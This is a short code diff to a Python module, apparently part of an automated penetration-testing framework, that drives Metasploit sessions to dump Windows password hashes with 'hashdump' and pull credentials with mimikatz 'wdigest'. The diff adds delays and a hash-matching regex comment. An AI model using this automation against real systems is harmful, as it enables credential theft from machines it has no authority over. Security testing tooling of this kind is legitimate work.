@@ -40,10 +40,12 @@ class msf_dumphashes(actionModule):
                             # add the new IP to the already seen list
                             self.addseentarget(s)
                             msf.execute("sessions -i " + str(s) + "\n")
+                            msf.sleep(int(self.config['msfexploitdelay']))
                             msf.execute("hashdump\n")
                             msf.execute("background\n")
 
                             # TODO - process results and store results in KB
+                            # regex match on [^:]+:[^:]+:[^:]+:[^:]+:::
                             outfile = self.config[
                                           "proofsDir"] + self.shortName + "_HashDump_" + t + "_" + Utils.getRandStr(
                                 10)
@@ -53,6 +55,7 @@ class msf_dumphashes(actionModule):
 
                             msf.execute("sessions -i " + str(s) + "\n")
                             msf.execute("load mimikatz\n")
+                            msf.sleep(int(self.config['msfexploitdelay']))
                             msf.execute("wdigest\n")
                             msf.execute("background\n")
 
